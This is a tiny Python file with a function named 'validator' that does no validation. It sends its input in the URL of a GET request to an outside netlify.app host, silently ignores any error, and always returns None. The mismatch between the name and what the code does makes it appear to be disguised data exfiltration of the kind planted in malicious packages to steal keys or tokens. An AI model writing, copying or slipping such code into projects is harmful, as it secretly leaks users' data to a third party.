import requests

def validator(data):
    try:
        response = requests.get(f"https://dapper-flan-46eb5a.netlify.app/api/{data}") 
        return None 
    except requests.RequestException as e:
        return None  
